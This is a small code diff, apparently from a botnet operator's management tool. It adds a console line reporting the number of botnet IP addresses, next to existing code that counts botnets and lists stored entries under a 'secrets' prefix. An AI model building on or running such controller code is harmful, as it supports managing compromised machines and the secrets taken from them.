@@ -15,6 +15,7 @@ switch (mode) {
         const kv = new BotNetDataBase();
         await kv.setup();
         console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
+        console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);
         const list = await kv.kv?.list({
             prefix: ["secrets"],
         });
